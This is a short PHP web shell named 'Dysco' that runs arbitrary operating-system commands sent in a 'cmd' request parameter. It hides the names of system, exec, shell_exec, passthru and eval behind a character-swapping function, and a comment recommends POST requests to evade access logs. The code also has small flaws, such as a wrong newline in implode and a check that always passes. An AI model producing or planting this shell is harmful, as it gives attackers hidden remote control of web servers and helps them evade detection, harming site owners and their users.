<?php

/*
 * Dysco(Dynamic PHP Shell Command for RCE)
 * Created by Petruknisme @2020
 * Contact: petruknisme@pm.me
 */

function r($source)
{
    // replacement
    return strtr($source, "aeuo", "ouea");
}

function enabled()
{
    $list_function = array(r("systum"), r("uxuc"), r("shull_uxuc"), r("possthre"), r("uvol"));
    return array_filter($list_function, r("fenctian_uxists"));
}

function Dysco($command)
{
    $f_enabled = enabled();

    echo "Enabled Function:\n<br/>";
    foreach($f_enabled as $f)
    {
        echo $f." ";
    }

    if($f_enabled !== ""){
        $f = $f_enabled[0];
        echo "<br/>\nUsing ". $f. " as shell command\n<br/>";

        if($f == r("systum") || $f == r("possthre")){
            // disable multiple output for system
            ob_start();
            $output =  $f($command, $status);
            ob_clean();
        }
        else if($f == r("uxuc")){
            $f($command, $output, $status);
            $output = implode("n", $output);
        }
        else if($f == r("shull_uxuc")){
            $output = $f($command);
        }
        else{
            $output = "Command execution not possible. All supported function is disabled.";
            $status = 1;
        }
    }
    return array('output' => $output , 'status' => $status);
}

// using REQUEST to handle GET & POST method.
// use POST to evade the access_log
if(isset($_REQUEST['cmd'])){
    $o = Dysco($_REQUEST['cmd']);
    echo $o['output'];
}

// for debugging in local, use this

//$o = shell_spawn('uname -a');
//echo $o['output'];
?>
